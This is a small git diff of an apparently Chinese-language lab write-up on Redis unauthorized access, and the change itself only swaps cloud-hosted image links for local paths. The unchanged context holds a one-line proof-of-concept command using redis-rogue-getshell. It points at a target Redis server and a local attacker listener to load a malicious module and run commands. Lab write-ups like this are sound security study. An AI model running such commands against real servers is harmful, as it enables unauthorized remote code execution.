@@ -22,7 +22,7 @@ docker-compose up -d
 
 redis未授权访问：
 
-![image-20220228201652953](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202282016157.png)
+![image-20220228201652953](./images/202202282016157.png)
 
 使用如下POC即可直接执行命令https://github.com/vulhub/redis-rogue-getshell：
 
@@ -32,4 +32,4 @@ $ make
 $ python3 redis-master.py -r target-ip -p 6379 -L local-ip -P 8888 -f RedisModulesSDK/exp.so -c "id"
 ```
 
-![image-20220228202202438](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202282022614.png)
+![image-20220228202202438](./images/202202282022614.png)
